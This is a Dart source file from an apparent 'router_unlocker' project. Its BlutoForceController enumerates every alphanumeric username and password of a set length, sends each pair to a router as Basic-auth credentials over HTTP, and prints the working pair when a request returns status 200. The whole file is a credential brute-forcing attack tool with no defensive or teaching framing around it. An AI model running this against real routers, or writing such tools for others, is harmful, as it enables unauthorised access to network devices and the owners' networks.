import 'dart:async';

import 'package:http/http.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:router_unlocker/httpController.dart';

class Res{
  final Response response;
  final String name;
  final String password;

  const Res({
    required this.response,
    required this.name,
    required this.password
  });
}

class BlutoForceController{
  final HttpController _httpController = HttpController();
  final HeadrCreater _headrCreater = HeadrCreater();

  Stream<Res> run(int length) async*{
    List<String> combinations = await generateCombinations(length);

    for(String nameCom in combinations){
      for(String passCom in combinations){
        Response response = await runReq(nameCom, passCom);
        yield Res(response: response, name: nameCom, password: passCom);
      }   
    }
  }

 Future<Response> runReq(String name, String pass) async {
    Base64Controller base64 = Base64Controller();
    base64.encodeText(name, pass);

    Uri uri = _headrCreater.getHeader(base64);

    Response response = await _httpController.getHttp(uri);

    if(response.statusCode == 200){
      print("Succeed!!! name = $name, pass = $pass");
    }

    return response;
  }
}

Future<List<String>> generateCombinations(int length) async {
  const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  List<String> combinations = [];

  void recurse(String prefix) {
    if (prefix.length == length) {
      combinations.add(prefix);
      return;
    }

    for (int i = 0; i < characters.length; i++) {
      recurse(prefix + characters[i]);
    }
  }

  recurse('');
  
  print('Generated ${combinations.length} combinations\n$combinations');

  return combinations;
}
